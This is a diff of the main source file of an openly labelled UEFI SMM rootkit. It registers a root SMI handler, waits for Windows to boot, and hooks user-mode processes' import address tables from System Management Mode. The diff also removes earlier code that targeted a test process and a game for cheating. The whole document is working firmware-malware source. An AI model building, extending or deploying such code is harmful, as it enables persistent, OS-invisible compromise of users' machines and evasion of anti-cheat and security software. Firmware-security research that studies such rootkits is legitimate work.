@@ -24,22 +24,9 @@
 #include "TimerRTC.h"
 #include "config.h"
 #include "serial.h"
-#include "CheatSmmRootkitTest.h"
+#include "WinUmdIATHook.h"
 #include "Memory.h"
 #include "NewNTKernelTools.h"
-
-
-/* 
- * Just a workaround for stupid MVSC pragmas
- * and other GCC-only warnings treated as errors.
- */
-#ifdef __GNUC__
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wunknown-pragmas"
-#pragma GCC diagnostic ignored "-Wunused-variable"
-#pragma GCC diagnostic ignored "-Wunused-value"
-#endif
-
 
 
 EFI_CPU_ARCH_PROTOCOL  *mCpu = NULL;
@@ -54,190 +41,166 @@ extern EFI_RUNTIME_SERVICES *gRT;
 
 // NTKernelTools.c
 extern WinCtx *winGlobal;
-BOOLEAN setupWindows;
 
-// For storing target-specific data
-static struct TargetInfo {
-	BOOLEAN setup;
-	VOID (*TargetMain)();
-	BOOLEAN (*IsRunning)();
-} targetInfo;
-
-
-BOOLEAN FindTarget()
-{
-	// setup for our test program
-	if(FindProcess(winGlobal, "smm_rootkit_te", FALSE))
-	{
-		SerialPrintStringDebug("\r\n== Found target: smm_rootkit_test! ==\r\n");
-		if(InitCheatTest())
-		{
-			targetInfo.setup = TRUE;
-			targetInfo.TargetMain = CheatTestMain;
-			// TODO: also fill IsRunning!
-			return TRUE;
-		}
-	}
-	// setup for something else?
-	else if(FindProcess(winGlobal, "TlsGame.exe", FALSE))
-	{
-		// setup for other game
-		// return TRUE;
-	}
-	return FALSE;
-}
-
-UINT32 start_time;
-UINT32 last_time;
-BOOLEAN os_ctx_initialized;
+// System initialization vars
+UINT32 SystemStartTime;
+UINT32 SystemUptime;
+BOOLEAN SystemInitOS;
 
 VOID SmmCallHandle()
 {
-	if(!os_ctx_initialized)
+	if(!SystemInitOS)
 	{
-		os_ctx_initialized = InitGlobalWindowsContext();
-		// give the target PC a bit more time to open up
-		if(!os_ctx_initialized)
+		// try to grab the windows Context
+		SystemInitOS = InitGlobalWindowsContext();
+		// give more time if it still failed
+		if(!SystemInitOS)
 		{
-			start_time = last_time;
+			SystemStartTime = SystemUptime;
 			return;
 		}
-		return;
 	}
 
 	// if the context has been initialized
-	if (targetInfo.setup == FALSE)
-	{
-		FindTarget();
-	}
-	else
-	{
-		targetInfo.TargetMain();
-	}
+	WindowsUmdIATHook();
 
 	return;
 }
 
 
-
 EFI_STATUS EFIAPI SmmHandler(IN EFI_HANDLE  DispatchHandle, IN CONST VOID  *Context         OPTIONAL, IN OUT VOID    *CommBuffer      OPTIONAL, IN OUT UINTN   *CommBufferSize  OPTIONAL)
 {
-	if(os_ctx_initialized)
+	// if the OS has not been initialized
+	if(!SystemInitOS)
 	{
-		SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
-		//delayer = 0;
-		SmmCallHandle();
-		return EFI_SUCCESS;
+		// count if the OS SHOULD be initialized
+		UINT16 TimeSinceLastSMI = CmosGetCurrentTime();
+
+		// Did we overflow? This happens once every hour
+		if(TimeSinceLastSMI < SystemUptime)
+			SystemUptime += TimeSinceLastSMI;
+		else
+			SystemUptime = TimeSinceLastSMI;
+
+		// ctx not initialized and system hasn't booted completely
+		if(SystemUptime - SystemStartTime < 10)
+		{
+			return EFI_SUCCESS;
+		}
 	}
 
-	// else, count more seconds
-	UINT16 curr_time = CmosGetCurrentTime();
-
-	// did we overflow the UINT16?
-	if(curr_time < last_time)
-		last_time += curr_time;
-	else
-		last_time = curr_time;
-
-	// here we just need to assume something, so we assume 30 seconds
-	if(last_time - start_time > 10)
-	{
-		SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
-		//delayer = 0;
-		SmmCallHandle();
-	}
+	SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
+	SmmCallHandle();
 	return EFI_SUCCESS;
 }
-
 
 
 EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable)
 {
-	// Write to serial port
-	SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
+  // Write to serial port
+  SerialPortInitialize(SERIAL_PORT_0, SERIAL_BAUDRATE);
+  SerialPrintString("\r\n");
+  SerialPrintString("--------------------------------------------\r\n");
+  SerialPrintString("|                                          |\r\n");
+  SerialPrintString("|          S M M    R O O T K I T          |\r\n");
+  SerialPrintString("|                                          |\r\n");
+  SerialPrintString("|    shoutout to   rainbowrawr, Cr4sh,     |\r\n");
+  SerialPrintString("|   ufrisk, Heep042, authors of LongKit    |\r\n");
+  SerialPrintString("|                                          |\r\n");
+  SerialPrintString("--------------------------------------------\r\n");
+  SerialPrintString("\r\n");
 
-	// Save the system tables etc. in global variable for further usage
-	gST = SystemTable;
-	gBS = SystemTable->BootServices;
-	gRT = SystemTable->RuntimeServices;
+  // Save the system tables etc. in global variable for further usage
+  gST = SystemTable;
+  gBS = SystemTable->BootServices;
+  gRT = SystemTable->RuntimeServices;
 
-	SerialPrintString("--------------------------------------------\r\n");
-	SerialPrintString("|                                          |\r\n");
-	SerialPrintString("|          S M M    R O O T K I T          |\r\n");
-	SerialPrintString("|                                          |\r\n");
-	SerialPrintString("--------------------------------------------\r\n");
-	SerialPrintString("                                              \r\n");
+  EFI_STATUS                res;
+  EFI_SMM_BASE2_PROTOCOL    *SmmBase2;
 
-	EFI_STATUS					Res;
-	EFI_SMM_BASE2_PROTOCOL		*SmmBase2;
+  EFI_GUID SmmBase2Guid = EFI_SMM_BASE2_PROTOCOL_GUID;
+  EFI_GUID SmmDispatch = EFI_SMM_SW_DISPATCH2_PROTOCOL_GUID;
+  EFI_GUID SmmCpuIo = EFI_SMM_CPU_IO2_PROTOCOL_GUID;
+  EFI_GUID SmmCpuProt = EFI_SMM_CPU_PROTOCOL_GUID;
 
-	EFI_GUID					SmmBase2Guid = EFI_SMM_BASE2_PROTOCOL_GUID;
-	EFI_GUID					SmmDispatch = EFI_SMM_SW_DISPATCH2_PROTOCOL_GUID;
-	EFI_GUID					SmmCpuIo = EFI_SMM_CPU_IO2_PROTOCOL_GUID;
-	EFI_GUID					SmmCpuProt = EFI_SMM_CPU_PROTOCOL_GUID;
+  EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;
 
-	EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;
+  // need EFI_SMM_BASE2_PROTOCOL
+  if((res = SystemTable->BootServices->LocateProtocol(&SmmBase2Guid, NULL, (void**)&SmmBase2)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	// need EFI_SMM_BASE2_PROTOCOL
-	Res = SystemTable->BootServices->LocateProtocol(&SmmBase2Guid, NULL, (void**)&SmmBase2);
-	if (Res != EFI_SUCCESS) return Res;
+  // get EFI_SMM_SYSTEM_TABLE2 in global var
+  if((res = SmmBase2->GetSmstLocation(SmmBase2, &gSmst2)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	// get EFI_SMM_SYSTEM_TABLE2 in global var
-	Res = SmmBase2->GetSmstLocation(SmmBase2, &gSmst2);
+  if((res = gSmst2->SmmLocateProtocol(&SmmCpuIo, NULL, (void**)&gSmmIo)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	if (Res != EFI_SUCCESS) return Res;
+  if((res = SystemTable->BootServices->LocateProtocol(&gEfiCpuArchProtocolGuid, NULL, (void**)&mCpu)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	Res = gSmst2->SmmLocateProtocol(&SmmCpuIo, NULL, (void**)&gSmmIo);
+  if((res = gSmst2->SmmLocateProtocol(&SmmCpuProt, NULL, (void**)&gSmmCpu)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	Res = SystemTable->BootServices->LocateProtocol(&gEfiCpuArchProtocolGuid, NULL, (void**)&mCpu);
+  // Register SMM Root Handler, discard the returning handle (we never unload the handler)
+  EFI_HANDLE					hSmmHandler;
+  if((res = gSmst2->SmiHandlerRegister(&SmmHandler, NULL, &hSmmHandler)) != EFI_SUCCESS)
+  {
+    return res;
+  }
 
-	void *Registration = NULL;
+  // Initialize the virtual memory map for UEFI
+  SerialPrintStringDebug("Initializing UEFI Memory Map \r\n");
+  if(!InitUefiMemoryMap())
+  {
+    SerialPrintString("Failed dumping Memory Map for UEFI \r\n");
+    return EFI_ERROR_MAJOR;
+  }
+  SerialPrintStringDebug("Successfully dumped Memory Map \r\n");
 
-	EFI_STATUS Status = EFI_SUCCESS;
+  SerialPrintStringDebug("Memory Map at: 0x");
+  SerialPrintNumberDebug((UINT64)GetUefiMemoryMap(), 16);
+  SerialPrintStringDebug("\r\n");
 
-	Res = gSmst2->SmmLocateProtocol(&SmmCpuProt, NULL, (void**)&gSmmCpu);
+  // Allocate memory for windows context.
+  // This is allocated straight as a page 
+  // to prevent our cheap malloc trashing it
+  EFI_PHYSICAL_ADDRESS physAddr;
+  gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);
+  winGlobal = (WinCtx*)physAddr;
+  SerialPrintStringDebug("WinGlobal: 0x");
+  SerialPrintNumberDebug((UINT64)winGlobal, 16);
+  SerialPrintStringDebug("\r\n");
 
-	// Register an SMM Root Handler
-	EFI_HANDLE					hSmmHandler;
-	Res = gSmst2->SmiHandlerRegister(&SmmHandler, NULL, &hSmmHandler);
+  // Set the start time of the PC
+  SystemStartTime = CmosGetCurrentTime();
+  SystemUptime = SystemStartTime;
+  SerialPrintStringDebug("Start time was: ");
+  SerialPrintNumberDebug(SystemStartTime, 10);
+  SerialPrintStringDebug("\r\n");
 
-	// Get memory map
-	SerialPrintStringDebug("Initializing UEFI Memory Map \r\n");
-	if(InitUefiMemoryMap() == FALSE)
-	{
-		SerialPrintStringDebug("Failed dumping Memory Map \r\n");
-		return EFI_ERROR_MAJOR;
-	}
-	SerialPrintStringDebug("Successfully dumped Memory Map \r\n");
+  // Initialize our own heap with some memory to be used
+  if(InitMemManager(100))
+  {
+    SerialPrintStringDebug("memory manager successfully initialized!\r\n");
+  }
 
-	SerialPrintStringDebug("Memory Map at: ");
-	SerialPrintNumberDebug((UINT64)GetUefiMemoryMap(), 16);
-	SerialPrintStringDebug("\r\n");
+  // Initialize the os ctx value, so no useless 
+  // probing is done while the OS hasn't even booted
+  SystemInitOS = FALSE;
 
-	// allocate memory for windows context (useless)
-	os_ctx_initialized = FALSE;
-	EFI_PHYSICAL_ADDRESS physAddr;
-	gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);
-	winGlobal = (WinCtx *)physAddr;
-	SerialPrintStringDebug("WinGlobal: 0x");
-	SerialPrintNumberDebug((UINT64)winGlobal, 16);
-	SerialPrintStringDebug("\r\n");
+  // Initialize the UMD IAT Hooking state
+  InitWindowsUmdIATHook();
 
-	// Set the start time of the PC
-	start_time = CmosGetCurrentTime();
-	SerialPrintStringDebug("Start time was: ");
-	SerialPrintNumberDebug(start_time, 10);
-	SerialPrintStringDebug("\r\n");
-
-	if(InitMemManager(100))
-	{
-		SerialPrintStringDebug("memory manager successfully initialized!\r\n");
-	}
-
-	return EFI_SUCCESS;
+  return EFI_SUCCESS;
 }
-
-
-#ifdef __GNUC__
-#pragma GCC diagnostic pop
-#endif
